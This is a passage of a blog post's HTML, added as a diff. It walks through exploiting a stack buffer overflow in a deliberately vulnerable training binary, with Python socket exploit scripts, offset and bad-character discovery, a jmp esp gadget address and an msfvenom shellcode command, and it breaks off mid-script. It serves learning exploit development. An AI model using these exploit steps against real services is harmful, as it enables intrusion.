@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Exploiting Stack-Based Buffer Overflows on x86_64 Windows with Unstripped Binaries :: Goobersec Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Identifying and exploiting a stack-based buffer overflow in x86_64 Windows Machines with an unstripped binary" />
+<meta name="keywords" content="buffer overflow, Windows exploit, x86_64, reverse engineering" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://goobersec.github.io/posts/stack-based-buffer-overflow-on-windows/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="https://goobersec.github.io/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="https://goobersec.github.io/css/code.min.a80f4b473406eab3b1ef5e8614422607154d74a82393aadb501b9013540be1f7.css">
+
+  
+  <link rel="stylesheet" href="https://goobersec.github.io/css/custom.min.ea43cfc9cbc2d9d30cc89d3a7ac87a64443231a5e6594ab7ff7c5c9b952753e1.css">
+
+  
+  <link rel="stylesheet" href="https://goobersec.github.io/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="https://goobersec.github.io/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="https://goobersec.github.io/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="https://goobersec.github.io/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="https://goobersec.github.io/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="https://goobersec.github.io/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="https://goobersec.github.io/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="https://goobersec.github.io/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="https://goobersec.github.io/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="https://goobersec.github.io/css/terminal.min.e82555a0ef0de5bb605adc28fa1c22a7e36e34ea0a69794994223e1cf29e0489.css">
+
+  
+  <link rel="stylesheet" href="https://goobersec.github.io/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+
+
+
+
+
+<link rel="shortcut icon" href="https://goobersec.github.io/favicon.png">
+<link rel="apple-touch-icon" href="https://goobersec.github.io/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Exploiting Stack-Based Buffer Overflows on x86_64 Windows with Unstripped Binaries">
+<meta property="og:description" content="Identifying and exploiting a stack-based buffer overflow in x86_64 Windows Machines with an unstripped binary" />
+<meta property="og:url" content="https://goobersec.github.io/posts/stack-based-buffer-overflow-on-windows/" />
+<meta property="og:site_name" content="Goobersec Blog" />
+
+  
+  
+  <meta property="og:image" content="https://goobersec.github.io/">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2025-05-28 18:07:44 -0400 EDT" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container center">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    G00B3R53C
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/posts">Posts</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about" >About</a></li>
+        
+      
+        
+          <li><a href="/posts" >Posts</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://goobersec.github.io/posts/stack-based-buffer-overflow-on-windows/">Exploiting Stack-Based Buffer Overflows on x86_64 Windows with Unstripped Binaries</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2025-05-28</time><span class="post-author">Tom</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="https://goobersec.github.io/tags/windows/">Windows</a>&nbsp;
+      
+      #<a href="https://goobersec.github.io/tags/buffer-overflow/">Buffer Overflow</a>&nbsp;
+      
+      #<a href="https://goobersec.github.io/tags/windbg/">WinDbg</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="outline">Outline<a href="#outline" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>In my previous post, I examined identifying a buffer overflow in a Linux binary. This time, I will be looking at a Windows executable that was provided to me as part of a low-level computing workshop. The goals of this exercise are to walk through the entire process of exploit development, from discovery to exploitation. I will:</p>
+<ul>
+<li>Analyze a Windows binary using both static and dynamic debugging tools</li>
+<li>Identify vulnerable functions and understand how they fail</li>
+<li>Observe normal vs. abnormal behavior to spot vulnerabilities</li>
+<li>Trigger and control the crash, confirming it&rsquo;s exploitable</li>
+<li>Find useful ROP gadgets or code sequences within the binary</li>
+<li>Construct and deliver a payload to achieve code execution as proof of concept</li>
+<li>Use code execution to obtain a reverse shell</li>
+<li>Deepen understanding of Windows internals, memory layout, and exploit tooling</li>
+</ul>
+<hr>
+<h1 id="examining-the-executable">Examining the Executable<a href="#examining-the-executable" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>The Windows executable, AKA the portable executable (PE), is one of the many types of binaries that Windows uses and is the most common way that commodity programs are launched. I have been given an executable aptly named <code>dostackbufferoverflowgood.exe</code>. If you have entered the field of security research or done enough buffer overflow CTFs, you may already know about this one. This one was made by justinsteven and can be found at his         <a href="https://github.com/justinsteven/dostackbufferoverflowgood?tab=readme-ov-file" target="_blank" rel="noopener">Github</a> repository, complete with instructions. However, where this guide uses Immunity Debugger, we will be using WinDbg.</p>
+<p>To start, let&rsquo;s start off by looking at this executable over in binaryninja. The first thing we see is there is what appears to be a port listening on 31337.
+<img alt="binja1" src="/052825/0528-binja1.png">
+Right below that, there&rsquo;s a bit of error handling.
+<img alt="binja2" src="/052825/0528-binja2.png">
+If it catches what is presumably a connection, it&rsquo;s going to use the <code>_handleConnection</code> function.
+<img alt="binja3" src="/052825/0528-binja3.png">
+If we check that function, there are some sort of bytes received from a user.
+<img alt="binja4" src="/052825/0528-binja4.png">
+After that, there is some sort of <code>_doResponse</code> function that gets called.
+<img alt="binja5" src="/052825/0528-binja5.png">
+We can look at where that <code>_doResponse</code> function is initialized and get some good information. It requires a <code>clientName</code>, and more interestingly we see that there is a very special function called within it: <code>sprintf</code>
+<img alt="binja6" src="/052825/0528-binja6.png">
+The <code>sprintf()</code> function is an insecure way to output information because it doesn&rsquo;t perform bounds checking. This is where out exploit lies.</p>
+<p>To recap, we have the <code>dostackbufferoverflowgood.exe</code>. It starts up, sets up a port to handle the connection. Once it gets the connection it goes to <code>doResponse</code>. The buffer overflow vulnerability is on the <code>sprintf</code> because it&rsquo;s taking input from the <code>clientName</code> parameter which can be controlled by the attacker. It will be written into the <code>buf</code> variable which is susceptible to buffer overflow.</p>
+<p>First we want to look to see if there are any interesting areas where we want to break. We can see where it calls the <code>doResponse</code> by pulling out to the graph view.
+<img alt="binja7" src="/052825/0528-binja7.png">
+We will grab the memory address at <code>0x804168d</code> to reference later when breaking. We can reliably do this only because this was not compiled as position independent executable, it should always be there.</p>
+<p>We will want to set another break point at the function epilogue of <code>doResponse</code> when it&rsquo;s tearing down at <code>0x8041794</code>
+<img alt="binja8" src="/052825/0528-binja8.png"></p>
+<hr>
+<h1 id="testing-program-functionality">Testing Program Functionality<a href="#testing-program-functionality" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>We know that it listens on port 31337, so we first test the intended functionality.
+<img alt="testing1" src="/052825/0528-testing1.png">
+<img alt="testing2" src="/052825/0528-testing2.png">
+So it just gives us back whatever we give it. Nothing too thrilling.</p>
+<p>So now we will launch WinDbg and start debugging the program. I am not super familiar with WindDbg, and won&rsquo;t be outlining too much with the &ldquo;how to use&rdquo; aspects here.</p>
+<p>We will set the breakpoints we decided before:</p>
+<ol>
+<li>0x804168d</li>
+<li>0x8041794</li>
+</ol>
+<p>then see what it looks like. We see the program listening for connections upon hitting Go, and it just hangs. Next, we need a python script that will handle connecting to our Windows machine. I am actually doing this the inefficient way and I have three machines running:</p>
+<ul>
+<li>Windows for running the programming and debugging</li>
+<li>Kali for buffer overflow-specific tools</li>
+<li>Linux Mint for comfort doing misc things/debugging</li>
+</ul>
+<p>I&rsquo;ll write the script over on my Mint machine. It was provided for me, but to be honest this wasn&rsquo;t outside of my capabilities.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ip</span> <span class="o">=</span> <span class="s2">&#34;192.168.1.221&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">31337</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;Python Script&#39;</span>  <span class="c1"># use b&#39;&#39; for bytes</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Sent: </span><span class="si">{</span><span class="n">buf</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Received </span><span class="si">{</span><span class="n">data</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><p>This script is going to reach out to the Windows box and send some bytes over and print what was sent. Now with the program started and our python script ready, we can shoot it at the box. Once we connect, we can continue on the script to the first breakpoint.
+<img alt="testing3" src="/052825/0528-testing3.png"></p>
+<p>In WinDbg, we can view the registers pretty much exactly the same as we can in gdb. My values at EAX, EBX, ECX, EDI, ESP, EBP are all different from my guide&rsquo;s,but apparently that doesn&rsquo;t matter too much. If your <code>EIP</code> and memory layout are correct — that&rsquo;s what matters most for control flow and gaining code execution. <code>ECX</code>, <code>EAX</code>, and <code>EBP</code> are especially likely to be changing. Unless your exploit relies on a specific register value being correct (e.g., shellcode using <code>ECX</code> as a base pointer), these differences won’t stop us.
+<img alt="testing4" src="/052825/0528-testing4.png">
+You can see how things are moving up and down the stack as you step into functions, and it&rsquo;s all very interesting, but what we came here to see was how our bytes sent over look on the stack. Finally, we reach the line where the vulnerability is going to be occurring.
+<img alt="testing4" src="/052825/0528-testing5.png">
+Stepping over that, we can now see our <code>Hello Python Script!!!</code> on the stack:
+<img alt="testing6" src="/052825/0528-testing6.png">
+Finally, we move to the function epilogue
+<img alt="testing7" src="/052825/0528-testing7.png">
+The function epilogue is going to move the base pointer into the stack pointer and tear everything down; the exact inverse of the function prologue. If we step through the <code>pop ebp</code>, it&rsquo;s going to move the stack pointer to the base pointer.
+<img alt="testing8" src="/052825/0528-testing8.png">
+As we can see, the <code>ESP</code> and <code>EBP</code> now have the same value. After this, the <code>ret</code> instruction will take us out, and to the address at <code>08041692</code> which is the next instruction following the <code>doResponse</code> function.</p>
+<hr>
+<h1 id="testing-the-stack">Testing the Stack<a href="#testing-the-stack" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>Instead of sending something normal, we&rsquo;re going to modify our python script to send this in it instead:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">1024</span>
+</span></span></code></pre></div><p>Once we do that and start the program again, we can fire it at the Windows box and see what happens. Uppon stepping into the function of <code>doResponse</code> you can already see trouble coming:
+<img alt="prodding1" src="/052825/0528-prodding1.png">
+If we move to the function epilogue, we can see some bad stuff about to go down:
+<img alt="prodding2" src="/052825/0528-prodding2.png">
+After the function epilogue this time at the <code>pop ebp</code> is it is going to try to restore the original base pointer and pop whatever is on top of the stack into <code>ebp</code>. There&rsquo;s just one problem:
+<img alt="prodding3" src="/052825/0528-prodding3.png">
+We have overwritten the original base pointer AND original address. This is the idea of stack smashing. So if we move to the <code>ret</code>:
+<img alt="prodding4" src="/052825/0528-prodding4.png">
+Now we see <code>EBP</code> is just holding junk. As you can imagine, we cannot jump to this memory address. You can&rsquo;t even un-assemble it using <code>u 41414141</code>. Immediately following this <code>ret</code> instruction, the program will crash.</p>
+<hr>
+<h1 id="finding-where-to-overwrite">Finding Where to Overwrite<a href="#finding-where-to-overwrite" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>To abuse the program that we know is susceptible to buffer overflows, we will need to know the exact number of opcodes to send through. To do that, we will use our built-in Metasploit tool, <code>msf-pattern_create</code>. On our Kali box, we can run <code>msf-pattern_create -l 1024</code> and it will generate an output similar to this:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0B
+</span></span></code></pre></div><p>Now our python script has this in quotes instead of the 1024 A&rsquo;s. For what we do next, we simply run the program and continue it until it crashes. What we want to see is what exactly is on the <code>EIP</code> register. We can query based on this and see where in the string that is located.
+<img alt="overwrite1" src="/052825/0528-overwrite1.png">
+Once we have our number, we can use another nifty tool found in Metasploit.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ msf-pattern_offset -q <span class="m">39654138</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Exact match at offset <span class="m">146</span>
+</span></span></code></pre></div><p>To confirm the number is 146, we will modify the exploit again. We will keep a consistent number in the script for <code>buf_totlen</code> for reasons that justinsteven outlines in the PDF file provided with the binary.</p>
+<pre tabindex="0"><code>It’s sometimes necessary to keep the total length of what you’re sending constant. Some programs will behave differently with differently sized inputs, and until
+you’re certain that this won’t affect your exploit, you should keep the length constant. In our case, let’s always send buf_totlen (1024) characters followed
+by a newline. It’s not needed for dostackbufferoverflowgood.exe but it’s a
+good habit to pick up early-on.
+</code></pre><p>With this in mind, let&rsquo;s see what our exploit looks like now:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ip</span> <span class="o">=</span> <span class="s2">&#34;192.168.1.221&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">31337</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buf_totlen</span> <span class="o">=</span> <span class="mi">1024</span>
+</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mi">146</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span> <span class="c1"># making code more flexible</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span><span class="sa">b</span><span class="s1">&#39;BBBB&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span><span class="sa">b</span><span class="s1">&#39;C&#39;</span><span class="o">*</span><span class="p">(</span><span class="n">buf_totlen</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Sent: exploit&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><p>At this point, the goal of the script is to:</p>
+<ol>
+<li>
+<p>Reach the exact offset to overwrite a saved return address (EIP in x86).</p>
+</li>
+<li>
+<p>Inject a test pattern (BBBB) where the instruction pointer would go.</p>
+</li>
+<li>
+<p>Pad the rest of the buffer to a total length (buf_totlen) that matches the application&rsquo;s vulnerable buffer size.</p>
+</li>
+</ol>
+<p>As for the new section that seems to be doing some funky subtraction, the reasons for this are related to what justinsteven said.</p>
+<pre tabindex="0"><code>It’s way of saying “append enough of the character to make the string be something characters long”. len(buf) is the current length of the string, so we subtract it from something to get the number of characters we need to append to take it out to a total length of something.
+Note that we do it every time, even for the A’s. len(buf) will be 0 when we append these A’s, but if we ever need to add something in at the beginning of the A’s then we can slip it in and the appending of A’s will automatically adjust to compensate. 
+</code></pre><p>I forgot to grab my screenshot, but the result of sending the exploit off is that we have <code>42424242</code> in the <code>EIP</code>, meaning we&rsquo;ve got it right.</p>
+<hr>
+<h1 id="identifying-bad-characters">Identifying Bad Characters<a href="#identifying-bad-characters" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>Out of all the possible binary data we can send it, there are characters that have special meaning that we don&rsquo;t want to send to the program. One of them is the null byte <code>x00</code>. Here, the data is being read in at <code>sprintf</code>, so we&rsquo;ll see if there are any other special characters it uses (hint: if you know anything about programming you could make an educated guess). We can do it with a quick python command.</p>
+<pre tabindex="0"><code>tom@VirtualBox ~/Desktop $ python3
+Python 3.12.3 (main, Feb  4 2025, 14:48:35) [GCC 13.3.0] on linux
+Type &#34;help&#34;, &#34;copyright&#34;, &#34;credits&#34; or &#34;license&#34; for more information.
+&gt;&gt;&gt; for x in range (1, 256):
+...   print(&#34;\\x&#34; + &#34;{:02x}&#34;.format(x), end=&#39;&#39;)
+</code></pre><p>This is generating a byte string representation of all possible single-byte values from <code>\x01</code> to <code>\xff</code>, and printing them all out.</p>
+<p>Now, instead of sending a bunch of A&rsquo;s, we will fire this off to see if it freaks out reacting to specific characters. We simply edit the payload variable to contain all of these and send it off. For cleaner output we also will replace the end of the script with <code>print(f&quot;Sent: exploit&quot;)</code> so that we&rsquo;re not getting junk output back anymore.</p>
+<p>We ship it off and catch it over in WinDbg, it crashes, and now we view the bytes on the stack with <code>db esp</code>
+<img alt="badchar1" src="/052825/0528-badchar1.png">
+What we are looking for is that it continues from <code>01</code> to <code>ff</code>. If there&rsquo;s a break it in, that means there is likely a bad character. Normally after <code>09</code> we would expect to see <code>0a</code>, but that&rsquo;s not what we have. Because of this, we can assume <code>0a</code> is a bad character in this program.</p>
+<p>We need to go to our exploit and delete the <code>x0a</code>, then start again. This process will repeat (if necessary) until all bad characters are eliminated. Once that is gone, now we see it counting all the way in the Memory view of WinDbg.
+<img alt="badchar2" src="/052825/0528-badchar2.png">
+So we know our bad characters are <code>x00</code> and <code>x0A</code>.  The <code>sprintf</code> function obviously uses the null byte for terminating a string. Less intuitive is the <code>x0a</code>, which is a line feed (LF) character, and enters in a newline in most Unix-like systems. Knowing that, it makes sense why either of these might cause our shellcode to not work properly.</p>
+<hr>
+<h1 id="identifying-an-executable-memory-segment">Identifying An Executable Memory Segment<a href="#identifying-an-executable-memory-segment" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>What we need to find now is a memory segment that is executable. Ordinarily, data execution prevention (DEP) would stop this from happening, but we&rsquo;re learning right now :^) Put simply, one need only to find an instruction in the program that says to jump to the top of the stack so that memory location can be utilized. We will hunt for that in binary ninja. In this case, it&rsquo;s easy because the program is small, so we can look in Memory Map.
+<img alt="finding1" src="/052825//0528-finding1.png">
+The <code>.txt</code> start and end address are what we are interested in:</p>
+<ol>
+<li><code>08041000</code></li>
+<li><code>0804285d</code></li>
+</ol>
+<p>To find a gadget we might be able to use to get a <code>jmp esp</code>, we need to know the opcode associated with the <code>jmp esp</code> instruction. We can find this out in kali with:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ msf-metasm_shell              
+</span></span><span class="line"><span class="cl"><span class="nb">type</span> <span class="s2">&#34;exit&#34;</span> or <span class="s2">&#34;quit&#34;</span> to quit
+</span></span><span class="line"><span class="cl">use <span class="s2">&#34;;&#34;</span> or <span class="s2">&#34;\n&#34;</span> <span class="k">for</span> newline
+</span></span><span class="line"><span class="cl"><span class="nb">type</span> <span class="s2">&#34;file &lt;file&gt;&#34;</span> to parse a GAS assembler <span class="nb">source</span> file
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">metasm &gt; jmp esp
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;\xff\xe4&#34;</span>
+</span></span></code></pre></div><p>Next in Windbg, we want to use <code>s -b 08041000 0804285d FF E4</code> to give it that start and end section, plus the opcode.
+Here’s what we’re doing:</p>
+<ul>
+<li>
+<p>s: search memory</p>
+</li>
+<li>
+<p>-b: search in byte mode</p>
+</li>
+<li>
+<p><code>08041000 0804285d</code>: the memory range of the .txt section, which we already verified is executable</p>
+</li>
+<li>
+<p>FF E4: the opcode for the jmp esp instruction
+The reason for this is that it&rsquo;s not enough that we can execute in the two aforementioned locations; they need to have the specific instructions we need too. Remember, the stack pointer (<code>ESP</code>) will point to the top of our buffer where we’ve injected our payload. By overwriting <code>EIP</code> with the address of a <code>jmp esp</code>, we are telling it to just go execute whatever is at the top of the stack.
+<img alt="finding2" src="/052825//0528-finding2.png">
+There are two memory locations that can serve us here:</p>
+</li>
+</ul>
+<ol>
+<li><code>080414c3</code></li>
+<li><code>080416bf</code>
+<img alt="finding3" src="/052825//0528-finding3.png">
+<img alt="finding4" src="/052825//0528-finding4.png">
+The first is right after the call to <code>handleConnection+0x53</code>. The second one is at <code>handleConnection+0x24f</code></li>
+</ol>
+<p>This jump instruction is what we can consider a <em>gadget</em>. It is a short sequence of instructions already present in the binary that we can use for our own purposes. It isn&rsquo;t always a jump instruction, but it usually involves jumping or returns.</p>
+<p>We will use the <code>080414c3</code> address to push to the stack. We must also remember endianness; we will have to put it in reverse order for x86. That means it will end up as <code>c3130408</code>.</p>
+<p>We will craft our payload on kali with msfvenom, and we will start by executing a program first. I&rsquo;ll do that with a quick command: <code>msfvenom -p windows/exec -b '\x00\x0A' -f python --var-name shellcode CMD=calc.exe EXITFUNC=thread</code></p>
+<p>The <code>-b</code> is excluding the bad characters identified earlier, the <code>--var-name</code> is conveniently giving us our shellcode lines in python in bytes, and of course we are using <code>CMD=</code> to spawn calculator. Finally, we use EXITFUNC=thread to prevent the entire application from crashing after your shellcode runs. I don&rsquo;t have much experience with this, but it apparently happens when the shellcode is injected into a thread, or you&rsquo;re exploiting a service. I may do a write up on why that is at a later date.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ip</span> <span class="o">=</span> <span class="s2">&#34;192.168.1.221&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">31337</span>
+</span></span><span class="line"><span class="cl">
